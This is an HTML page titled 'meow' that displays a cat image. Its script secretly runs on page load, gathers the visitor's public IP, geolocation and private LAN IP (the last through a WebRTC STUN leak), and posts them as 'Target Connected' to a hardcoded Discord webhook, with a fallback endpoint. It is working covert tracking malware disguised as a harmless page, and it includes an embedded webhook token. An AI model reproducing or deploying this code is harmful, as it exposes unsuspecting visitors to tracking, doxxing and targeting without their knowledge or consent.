<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>meow</title>
  <style>
    body { background:#000; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; }
    img { max-width:90%; border-radius:10px; }
    #st { position:fixed; bottom:4px; left:4px; color:#333; font:11px monospace; }
  </style>
</head>
<body>
  <img src="https://cataas.com/cat" alt="cat">
  <div id="st"></div>
  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ";
    const st = document.getElementById("st");
    const log = m => { st.textContent = m; console.log(m); };
    const timeout = (p, ms) => Promise.race([p, new Promise(r => setTimeout(r, ms))]);

    async function send() {
      let pub = "unknown", priv = "unknown", geo = "unknown";

      try {
        const r = await timeout(fetch("https://api.ipify.org?format=json"), 5000);
        pub = (await r.json()).ip;
        log("pub:" + pub);
      } catch(e) { log("pub fail"); }

      try {
        const r = await timeout(fetch("https://ipwho.is/" + pub), 5000);
        const d = await r.json();
        if (d.success) geo = d.city + ", " + d.region + ", " + d.country;
        log("geo:" + geo);
      } catch(e) { log("geo fail"); }

      try {
        await timeout(new Promise(resolve => {
          const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
          pc.createDataChannel("x");
          const done = () => { try{pc.close();}catch(e){} resolve(); };
          const timer = setTimeout(done, 2500);
          const isPrivate = ip => /^10\.|^192\.168\.|^172\.(1[6-9]|2\d|3[01])\./.test(ip);
          pc.onicecandidate = e => {
            if (e.candidate && e.candidate.type === "host") {
              const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
              if (m && isPrivate(m[1])) { priv = m[1]; clearTimeout(timer); done(); }
            }
          };
          pc.createOffer().then(o => pc.setLocalDescription(o)).catch(done);
        }), 3000);
        log("priv:" + priv);
      } catch(e) { log("priv fail"); }

      const payload = JSON.stringify({
        embeds: [{
          title: "Target Connected",
          color: 0xff0000,
          fields: [
            {name: "public ip", value: pub, inline: false},
            {name: "private ip", value: priv, inline: false},
            {name: "geolocation", value: geo, inline: false}
          ]
        }]
      });

      try {
        const r = await timeout(fetch(WEBHOOK, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: payload
        }), 8000);
        log("sent:" + r.status);
      } catch(e) {
        log("direct fail, trying api route");
        try {
          await timeout(fetch("/api/grab", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({pub, priv, geo})
          }), 8000);
          log("api route sent");
        } catch(e2) { log("all methods failed"); }
      }
    }

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", send);
    } else {
      send();
    }
  </script>
</body>
</html>
